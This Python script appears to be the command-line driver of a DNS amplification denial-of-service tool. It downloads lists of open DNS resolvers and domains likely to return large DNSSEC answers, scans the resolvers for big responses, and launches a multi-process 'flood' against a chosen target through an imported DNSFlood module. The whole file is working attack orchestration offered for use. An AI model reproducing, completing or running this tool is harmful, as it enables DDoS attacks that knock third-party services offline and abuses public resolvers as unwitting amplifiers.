import sys
import os
import requests
import re
from multiprocessing import Process, Queue, Value , Array
from ctypes import c_bool , c_long , create_string_buffer
from dns_flood import DNSFlood
from sniffer import IPSniff
from packet_consumer import Packet_Consumer

class Argument_Processor:

	def __init__(self):
		self.start_pack_status = Array( "c" , 200 , lock=False) #makes a character array that is shareable between processes

	def get_list( self , file_path ):
		file = open( file_path , "r" )
		lines = file.read().split("\n")
		for x in range( len(lines)-1 , 0 , -1):
			if lines[x] == "":
				del lines[x]
		file.close()
		return lines

	def process_args( self , args ):
		if len( args ) < 2 and (args[1] != "starter-pack" or args[1] != "scan" or args[1] != "flood"):
			print( "type: \'python amplifier.py --help\' for help ")

		
		elif args[1] == "--help" or args[1] == "-h":
			print( "Tell this lazy programmer to update the help message!")

			
		elif args[1] == "starter-pack":
			if len(args) < 3:
				print( "Usage: python amplifier.py starter-pack dir_to_save" )
			else:
				self.get_starter_pack( args[2] )
		elif args[1] == "scan":
		
			if len( args) < 6:
				print( "Usage:  python amplifier.py scan server_list domain_list network_interface min_packet_size")
			else:
				self.scan( self.get_list(args[2]) , self.get_list(args[3]) , args[4] , int(args[5]) )
			
		elif args[1] == "flood":
			if len( args ) < 6:
				print( "Usage: python amplifier.py flood scan_results iface target num_threads" )
			self.flood( self.get_list(args[2]) , args[3] , args[4] , int(args[5]) )

	def get_starter_pack( self ,dir ):
		dir = os.path.join( os.path.expanduser( dir ) , "starter-pack" )
		
		if not os.path.exists( dir ):
			os.mkdir( dir )
			
		self.get_servers( dir )
		self.get_domains( dir )
		print( "finished" )

	def get_servers( self , dir ):
		print( "Retrieving list of open DNS servers from https://public-dns.info/nameservers-all.txt")

		servers = requests.get("https://public-dns.info/nameservers-all.txt").text.split("\n")
		servers.pop()

		file = open( os.path.join( dir , "ipv4_dns_servers" ) , "w" )
		file2 = open( os.path.join( dir , "ipv6_dns_servers" ) , "w" )
		all_servers = open( os.path.join( dir , "all_servers" ) , "w" )

		for server in servers:
	        	if "." in server:
	                	file.write( server + "\n" )
	        	else:
	                	file2.write( server + "\n" )
	        	all_servers.write( server + "\n" )
		
		file.close()
		file2.close()
		all_servers.close()

	def get_domains( self , dir ):
		base="https://usgv6-deploymon.antd.nist.gov/cgi-bin/generate-"
		rest = ["com","gov","edu"]
		all_domains = open( dir+"/all_domains" , "w" )

		for ext in rest:
			print( "Retrieving domains likely to have dnssec(big) records from " + base + ext )
			r = requests.get( base + ext )

			if r.status_code != requests.codes.ok:
				print( "Failure to get websites for tld: " + ext )
				continue

			file = open( dir+"/"+ext+"_domains" , "w" )

			#print( "Parsing " + ext + " domains" )

			sites = re.findall(  "ANTD-0>.+?TD", r.text )
			regex = re.compile( ">"+ext+"\.[^\.]+" )

			for site in sites:
				matcher = regex.search( site )
				try:
					string = matcher.group().replace( ">"+ext+"." , "" ) + "."+ ext
	                        	#print( matcher.group(0) + " : " + string )
					file.write( string+"\n" )
					all_domains.write( string+"\n")
				except AttributeError: #matcher was None
					pass

			file.close()
			
		all_domains.close()

	def scan( self , server_list , domain_list , iface , min_pkt_size ):

		terminate_flag = Value( c_bool , False )
		sniffed_queue = Queue()

		sender_process = DNSFlood()
		sender_process.init_scan( server_list , domain_list , "scan" , terminate_flag )
		
		sniffer_process = IPSniff( iface , sniffed_queue , terminate_flag )
		consumer_process = Packet_Consumer( sniffed_queue , min_pkt_size , terminate_flag )

		print( "Starting threads" )
		sniffer_process.start()
		consumer_process.start()
		sender_process.start()


		while True:
			if not sender_process.is_alive():
				terminate_flag.value = True
				print( "Finished sending packets" )
				break
	
	def flood( self , scan_list , iface , target ,num_threads ):
		terminate_flag = Value( c_bool , False )
		procs = []
		for x in range( num_threads):														#the number of packets sent
			num_sent = Value( c_long , 0 )
			flooder = DNSFlood()
			flooder.init_flood(scan_list,iface,target,num_threads,x,terminate_flag,num_sent)
			procs.append( ( flooder , num_sent) )
			procs[x][0].start()
			print( "Started flooding thread " + str(x) )

		while True:
			string = input("Type \'quit\' to kill threads or \'list\' to see thread's statuses\n")
			if string == "quit":
				print( "Killing threads" )
				terminate_flag.value = True
				break
			elif string == "list":
				for x in range( len(procs) ):
					print( "Thread " + str(x) + ":is_alive()-" + str(procs[x][0].is_alive()) + ":packets_sent-"+str(procs[x][1].value) )


if __name__ == "__main__":
	arg_processor = Argument_Processor()
	arg_processor.process_args( sys.argv )

